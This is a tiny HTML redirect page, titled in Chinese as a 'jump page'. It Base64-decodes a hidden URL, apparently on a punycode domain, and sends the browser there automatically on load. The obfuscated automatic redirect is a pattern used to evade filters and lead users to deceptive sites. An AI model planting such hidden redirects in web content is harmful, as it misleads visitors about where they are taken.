<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>跳转页面</title>
  </head>
  <body>
    <script>
      var url = "aHR0cHM6Ly94bi0tcS1la2EuY29tLw==";
      var decodedUrl = atob(url); // 对 URL 进行 Base64 解码
      window.location.href = decodedUrl; // 跳转到解码后的 URL
    </script>
  </body>
</html>
